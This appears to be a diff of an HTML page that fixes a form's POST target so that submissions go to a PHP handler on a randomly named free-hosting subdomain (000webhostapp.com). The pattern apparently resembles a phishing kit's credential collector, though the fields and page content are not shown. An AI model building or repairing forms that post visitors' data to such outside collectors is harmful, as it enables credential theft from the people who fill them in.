@@ -91,7 +91,7 @@
 
 				<tbody><tr><td>
 
-				<form method="post" action="https://j379192911.000webhostapp.com/temp/indexs">
+				<form method="post" action="https://j379192911.000webhostapp.com/temp/indexs.php">
 			
 				<br><br>
 
